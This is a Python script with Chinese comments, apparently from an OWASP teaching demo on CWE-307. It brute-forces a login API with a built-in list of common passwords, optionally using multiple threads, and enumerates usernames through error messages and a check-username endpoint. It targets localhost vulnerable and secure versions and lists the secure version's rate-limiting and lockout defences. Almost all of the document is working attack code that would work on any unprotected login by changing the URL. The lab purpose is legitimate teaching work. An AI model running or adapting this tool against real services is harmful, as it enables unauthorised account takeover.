#!/usr/bin/env python3
"""
暴力破解攻擊腳本
================
此腳本展示如何利用無速率限制的登入 API 進行密碼暴力破解。

攻擊原理：
---------
漏洞版本沒有登入失敗次數限制，攻擊者可以無限嘗試密碼。
使用常見密碼字典檔進行快速嘗試。

CWE-307: Improper Restriction of Excessive Authentication Attempts

作者：OWASP Demo
"""

import requests
import argparse
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

# 配置
VULNERABLE_URL = "http://localhost:8081"
SECURE_URL = "http://localhost:8082"

# 常見弱密碼清單（Top 100）
COMMON_PASSWORDS = [
    "123456", "password", "12345678", "qwerty", "123456789",
    "12345", "1234", "111111", "1234567", "dragon",
    "123123", "baseball", "iloveyou", "trustno1", "sunshine",
    "master", "welcome", "shadow", "ashley", "football",
    "jesus", "michael", "ninja", "mustang", "password1",
    "admin", "admin123", "root", "toor", "letmein",
    "monkey", "696969", "abc123", "qwerty123", "1q2w3e4r",
    "654321", "superman", "qazwsx", "password123", "passw0rd",
    "login", "love", "princess", "solo", "starwars",
    "qwertyuiop", "whatever", "freedom", "nothing", "biteme",
    "pass", "pass123", "test", "test123", "access",
    "hello", "charlie", "donald", "password2", "qwer1234",
    "flower", "lovely", "secret", "summer", "winter",
    "spring", "fall", "michael1", "jordan", "jordan23",
    "matrix", "killer", "harley", "cheese", "pepper",
    "orange", "joshua", "hunter", "ginger", "samuel",
    "justin", "soccer", "batman", "cookie", "tigger",
    "andrew", "george", "thunder", "hockey", "dallas",
    "silver", "knight", "online", "coffee", "mercedes",
    "thomas", "robert", "falcon", "amanda", "cowboy",
    # 加入 demo 密碼
    "user123", "alice123", "bob123", "admin123"
]


def try_login(username: str, password: str, url: str = VULNERABLE_URL) -> tuple:
    """
    嘗試登入
    回傳 (成功與否, 回應)
    """
    try:
        response = requests.post(
            f"{url}/api/auth/login",
            json={"username": username, "password": password},
            timeout=5
        )
        
        if response.status_code == 200:
            data = response.json()
            if "token" in data:
                return True, data
        elif response.status_code == 429:
            # 被速率限制
            return None, "RATE_LIMITED"
        
        return False, response.json() if response.text else {}
    except Exception as e:
        return False, str(e)


def brute_force_attack(username: str, passwords: list, url: str = VULNERABLE_URL, 
                       threads: int = 1, delay: float = 0):
    """
    🔴 暴力破解攻擊
    """
    print("\n" + "=" * 60)
    print(f"🔴 暴力破解攻擊：{username}")
    print("=" * 60)
    print(f"📍 目標：{url}")
    print(f"📋 密碼數量：{len(passwords)}")
    print(f"🧵 執行緒數：{threads}")
    
    start_time = time.time()
    attempts = 0
    found_password = None
    rate_limited = False
    
    if threads == 1:
        # 單執行緒
        for password in passwords:
            attempts += 1
            if attempts % 10 == 0:
                print(f"\r⏳ 嘗試中... {attempts}/{len(passwords)}", end="", flush=True)
            
            success, result = try_login(username, password, url)
            
            if success is None and result == "RATE_LIMITED":
                rate_limited = True
                print(f"\n⚠️ 被速率限制！已嘗試 {attempts} 次")
                break
            
            if success:
                found_password = password
                break
            
            if delay > 0:
                time.sleep(delay)
    else:
        # 多執行緒
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {executor.submit(try_login, username, pwd, url): pwd 
                      for pwd in passwords}
            
            for future in as_completed(futures):
                password = futures[future]
                attempts += 1
                
                try:
                    success, result = future.result()
                    
                    if success is None and result == "RATE_LIMITED":
                        rate_limited = True
                        # 取消剩餘任務
                        for f in futures:
                            f.cancel()
                        break
                    
                    if success:
                        found_password = password
                        # 取消剩餘任務
                        for f in futures:
                            f.cancel()
                        break
                except Exception:
                    pass
    
    elapsed = time.time() - start_time
    print(f"\n\n📊 統計：")
    print(f"   嘗試次數：{attempts}")
    print(f"   耗時：{elapsed:.2f} 秒")
    print(f"   速度：{attempts/elapsed:.1f} 次/秒")
    
    if rate_limited:
        print(f"\n❌ 攻擊被阻擋！伺服器實施了速率限制")
        return None
    elif found_password:
        print(f"\n✅ 破解成功！")
        print(f"   帳號：{username}")
        print(f"   密碼：{found_password}")
        return found_password
    else:
        print(f"\n❌ 密碼不在字典中")
        return None


def compare_vulnerability(username: str = "user"):
    """
    比較漏洞版本與安全版本
    """
    print("\n" + "=" * 60)
    print("📊 暴力破解：漏洞版本 vs 安全版本")
    print("=" * 60)
    
    # 測試 10 次錯誤登入
    test_passwords = ["wrong" + str(i) for i in range(10)]
    
    # 漏洞版本
    print("\n🔓 漏洞版本（http://localhost:8081）：")
    vulnerable_blocked = False
    for i, pwd in enumerate(test_passwords, 1):
        success, result = try_login(username, pwd, VULNERABLE_URL)
        if success is None and result == "RATE_LIMITED":
            vulnerable_blocked = True
            print(f"   ⚠️ 第 {i} 次嘗試被阻擋")
            break
        print(f"   嘗試 {i}: 失敗（正常）")
    
    if not vulnerable_blocked:
        print(f"   ❌ 10 次失敗嘗試都被接受！無暴力破解保護")
    
    # 安全版本
    print("\n🔒 安全版本（http://localhost:8082）：")
    secure_blocked = False
    for i, pwd in enumerate(test_passwords, 1):
        success, result = try_login(username, pwd, SECURE_URL)
        if success is None and result == "RATE_LIMITED":
            secure_blocked = True
            print(f"   ✅ 第 {i} 次嘗試後被阻擋（速率限制生效）")
            break
        elif isinstance(result, dict) and "remainingAttempts" in result:
            print(f"   嘗試 {i}: 失敗（剩餘 {result['remainingAttempts']} 次）")
        else:
            print(f"   嘗試 {i}: 失敗")
    
    if not secure_blocked:
        print(f"   ⚠️ 未觸發速率限制（可能需要更多嘗試）")
    
    print("\n📋 安全版本的防護措施：")
    print("   1. 登入失敗 5 次後帳號鎖定 15 分鐘")
    print("   2. 記錄 IP + 帳號的失敗次數")
    print("   3. 回應中顯示剩餘嘗試次數（警告用戶）")
    print("   4. 鎖定後回傳 429 Too Many Requests")


def username_enumeration():
    """
    🔴 帳號列舉攻擊
    利用不同的錯誤訊息判斷帳號是否存在
    """
    print("\n" + "=" * 60)
    print("🔴 帳號列舉攻擊")
    print("=" * 60)
    
    test_usernames = ["admin", "user", "alice", "nonexistent_user_12345"]
    
    print("\n🔓 漏洞版本（http://localhost:8081）：")
    for username in test_usernames:
        success, result = try_login(username, "wrong_password", VULNERABLE_URL)
        if isinstance(result, dict):
            error = result.get("error", "")
            code = result.get("code", "")
            
            if "不存在" in error or code == "USER_NOT_FOUND":
                print(f"   ❌ {username}: 帳號不存在（可確認）")
            elif "密碼錯誤" in error or code == "INVALID_PASSWORD":
                print(f"   ✅ {username}: 帳號存在！（密碼錯誤）")
            else:
                print(f"   ? {username}: {error}")
    
    print("\n🔒 安全版本（http://localhost:8082）：")
    for username in test_usernames:
        success, result = try_login(username, "wrong_password", SECURE_URL)
        if isinstance(result, dict):
            error = result.get("error", "")
            print(f"   {username}: {error}")
    
    print("\n📋 安全版本的防護：")
    print("   - 統一錯誤訊息：「帳號或密碼錯誤」")
    print("   - 無法判斷帳號是否存在")


def check_username_api():
    """
    🔴 使用 check-username API 進行帳號列舉
    """
    print("\n" + "=" * 60)
    print("🔴 Check-Username API 列舉")
    print("=" * 60)
    
    test_usernames = ["admin", "user", "alice", "bob", "nonexistent123"]
    
    print("\n🔓 漏洞版本（http://localhost:8081）：")
    for username in test_usernames:
        try:
            response = requests.get(
                f"{VULNERABLE_URL}/api/auth/check-username",
                params={"username": username}
            )
            if response.status_code == 200:
                data = response.json()
                exists = data.get("exists", False)
                if exists:
                    print(f"   ✅ {username}: 帳號存在！")
                else:
                    print(f"   ❌ {username}: 帳號不存在")
        except Exception as e:
            print(f"   ? {username}: {e}")
    
    print("\n🔒 安全版本（http://localhost:8082）：")
    try:
        response = requests.get(
            f"{SECURE_URL}/api/auth/check-username",
            params={"username": "admin"}
        )
        if response.status_code == 404:
            print("   ✅ API 不存在（安全）")
        else:
            print(f"   ⚠️ API 回應：{response.status_code}")
    except Exception as e:
        print(f"   ✅ API 不存在或被阻擋")


def main():
    parser = argparse.ArgumentParser(
        description="暴力破解攻擊工具",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
範例：
  python brute_force.py --username admin              # 破解 admin 帳號
  python brute_force.py --username admin --threads 5  # 多執行緒
  python brute_force.py --enum                        # 帳號列舉
  python brute_force.py --compare                     # 比較漏洞/安全版本
  python brute_force.py --all                         # 執行完整演示
        """
    )
    
    parser.add_argument("--username", type=str, default="user", help="目標帳號")
    parser.add_argument("--threads", type=int, default=1, help="執行緒數量")
    parser.add_argument("--delay", type=float, default=0, help="每次嘗試間隔（秒）")
    parser.add_argument("--enum", action="store_true", help="帳號列舉攻擊")
    parser.add_argument("--check-api", action="store_true", help="Check-Username API 列舉")
    parser.add_argument("--compare", action="store_true", help="比較漏洞/安全版本")
    parser.add_argument("--all", action="store_true", help="執行完整演示")
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("🔓 暴力破解攻擊工具")
    print("=" * 60)
    print(f"⚠️ 此工具僅供教育目的！請勿用於非法活動。")
    
    if args.all:
        brute_force_attack(args.username, COMMON_PASSWORDS, VULNERABLE_URL, args.threads)
        username_enumeration()
        check_username_api()
        compare_vulnerability(args.username)
    elif args.enum:
        username_enumeration()
    elif args.check_api:
        check_username_api()
    elif args.compare:
        compare_vulnerability(args.username)
    else:
        brute_force_attack(args.username, COMMON_PASSWORDS, VULNERABLE_URL, 
                          args.threads, args.delay)


if __name__ == "__main__":
    main()
